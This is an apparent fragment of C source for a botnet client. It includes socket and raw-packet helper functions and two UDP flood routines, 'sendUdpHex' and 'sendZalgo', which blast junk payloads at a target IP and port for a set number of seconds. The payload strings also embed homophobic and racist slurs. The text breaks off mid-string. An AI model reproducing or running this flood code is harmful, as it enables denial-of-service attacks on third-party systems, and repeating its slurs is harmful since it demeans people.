    (void) sigprocmask(SIG_BLOCK, &nmask, &omask);
    do {
        pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
    } while (pid == -1 && errno == EINTR);
    (void) sigprocmask(SIG_SETMASK, &omask, NULL);
    fdopen_pids[fdes] = 0;
    return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd){
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got == 0 ? NULL : buffer;
}
static const long hextable[] = {
    [0 ... 255] = -1,
    ['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
    ['A'] = 10, 11, 12, 13, 14, 15,
    ['a'] = 10, 11, 12, 13, 14, 15
};
long parseHex(unsigned char *hex){
    long ret = 0;
    while (*hex && ret >= 0) ret = (ret << 4) | hextable[*hex++];
    return ret;
}
int wildString(const unsigned char* pattern, const unsigned char* string) {
    switch(*pattern)
    {
    case '\0': return *string;
    case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
    case '?': return !(*string && !wildString(pattern+1, string+1));
    default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
    }
}

int getHost(unsigned char *toGet, struct in_addr *i){
    struct hostent *h;
    if((i->s_addr = inet_addr(toGet)) == -1) return 1;
    return 0;
}
void uppercase(unsigned char *str){
    while(*str) { *str = toupper(*str); str++; }
}
void makeRandomStr(unsigned char *buf, int length){
    int i = 0;
    for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}
int recvLine(int socket, unsigned char *buf, int bufsize){
    memset(buf, 0, bufsize);

    fd_set myset;
    struct timeval tv;
    tv.tv_sec = 30;
    tv.tv_usec = 0;
    FD_ZERO(&myset);
    FD_SET(socket, &myset);
    int selectRtn, retryCount;
    if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
        while(retryCount < 10)
        {
            tv.tv_sec = 30;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(socket, &myset);
            if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                retryCount++;
                continue;
            }
            break;
        }
    }
    unsigned char tmpchr;
    unsigned char *cp;
    int count = 0;
    cp = buf;
    while(bufsize-- > 1){
        if(recv(KHcommSOCK, &tmpchr, 1, 0) != 1) {
            *cp = 0x00;
            return -1;
        }
        *cp++ = tmpchr;
        if(tmpchr == '\n') break;
        count++;
    }
    *cp = 0x00;
//      zprintf("recv: %s\n", cp);
    return count;
}
int connectTimeout(int fd, char *host, int port, int timeout){
    struct sockaddr_in dest_addr;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt;
    long arg = fcntl(fd, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(fd, F_SETFL, arg);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if(getHost(host, &dest_addr.sin_addr)) return 0;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

    if (res < 0) {
        if (errno == EINPROGRESS) {
            tv.tv_sec = timeout;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(fd, &myset);
            if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                lon = sizeof(int);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                if (valopt) return 0;
            }
            else return 0;
        }
        else return 0;
    }
    arg = fcntl(fd, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(fd, F_SETFL, arg);
    return 1;
}
int listFork(){
    uint32_t parent, *newpids, i;
    parent = fork();
    if (parent <= 0) return parent;
    numpids++;
    newpids = (uint32_t*)malloc((numpids + 1) * 4);
    for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
    newpids[numpids - 1] = parent;
    free(pids);
    pids = newpids;
    return parent;
}
in_addr_t findRandIP(in_addr_t netmask){
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short csum (unsigned short *buf, int count){
    register uint64_t sum = 0;
    while( count > 1 ) { sum += *buf++; count -= 2; }
    if(count > 0) { sum += *(unsigned char *)buf; }
    while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph){
    struct tcp_pseudo{
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_TCP;
    pseudohead.length=htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
    unsigned short output = csum(tcp,totaltcp_len);
    free(tcp);
    return output;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}
int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;     
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, 0);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}
//[+]================================================================================================================================================================================[+]

void sendUdpHex(unsigned char *ip, int port, int secs){
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    int rport;
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1){
        char * randstrings[] = {
        "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x930101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/0101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101minuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbf0101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA"
        "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
        "\x6D\x21\x65\x66\x67\x60\x60\x6C\x21\x65\x66\x60\x35\x2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\x6C\x65\x60\x30\x60\x2C\x65\x64\x54",
        "GAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAY0minuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbf101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101peopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeopleGAYpeople",
        "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45",
        "010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010minuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbf101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101",
        "y8rtyutvybt978b5tybvmx0e8ytnv58ytr57yrn56745t4twev4vt4te45yn57ne46e456be467mt6ur567d5r6e5n65nyur567nn55sner6rnut7nnt7yrt7r6nftynr567tfynxyummimiugdrnyb",
        "01010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101minuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbf0101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101",
        "7tyv7w4bvy8t73y45t09uctyyz2qa3wxs4ce5rv6tb7yn8umi9,minuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbf",
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfminuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbfAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA01010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdedsecrunsyoulilassniggaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        };
        if (a >= 50){
            hexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void sendZalgo(unsigned char *ip, int port, int secs){
    srand(time(0));
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    int rport;
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1){
        char * randstrings[] = {
            "65/x336/x352/x311/x314/x33f/x30f/x346/x33e/x30e/x30f/x357/x35d/x35b/x344/x300/x304/x324/x318/x322/x32b/x317/x328/x32f/x355/x6c/x338/x31b/x34a/x307/x355/x348/x333/x318/x359/x31f/x32c/x356/x355/x359/x66/x337/x31a/x344/x30b/x358/x301/x326/x71/x334/x34b/x30f/x30f/x304/x32d/x316/x33a/x347/x320/x359/x32a/x35c/x355/x33b/x31f/x332/x33b/x77/x336/x306/x344/x312/x342/x313/x353/x355/x31f/x326/x354/x35a/x69/x337/x302/x350/x31a/x344/x304/x305/x308/x343/x341/x300/x307/x319/x31f/x33c/x332/x32b/x348/x329/x34e/x348/x339/x347/x68/x335/x300/x312/x343/x309/x34a/x35b/x309/x312/x358/x346/x32f/x354/x329/x31c/x66/x338/x35b/x353/x348/x319/x316/x322/x328/x33c/x35c/x332/x73/x335/x310/x308/x331/x320/x31f/x326/x6c/x336/x34a/x312/x34b/x360/x30d/x31c/x33c/x31d/x349/x322/x359/x32b/x316/x324/x318/x354/x328/x318/x6b/x337/x31b/x315/x310/x302/x34c/x305/x343/x30f/x310/x340/x32a/x316/x31e/x32e/x320/x319/x325/x31c/x61/x334/x33e/x331/x333/x353/x33c/x328/x326/x32b/x68/x336/x33e/x350/x34b/x342/x32d/x325/x66/x336/x300/x30a/x30d/x35d/x344/x31a/x307/x342/x30f/x300/x34b/x312/x33e/x306/x352/x32c/x349/x348/x354/x355/x34e/x32c/x317/x355/x329/x339/x33c/x66/x334/x315/x34b/x308/x357/x307/x30e/x342/x342/x342/x30d/x300/x322/x319/x61/x336/x346/x30a/x33f/x31c/x332/x323/x321/x32f/x66/x336/x34c/x309/x303/x346/x303/x33f/x342/x305/x35b/x358/x343/x311/x313/x308/x32e/x353/x353/x31d/x316/x345/x64/x337/x30b/x303/x344/x31a/x352/x30b/x346/x316/x316/x32c/x347/x318/x356/x322/x332/x31c/x35c/x322/x326/x2c/x337/x346/x306/x344/x357/x30a/x341/x314/x344/x31a/x323/x325/x326/x348/x31c/x332/x73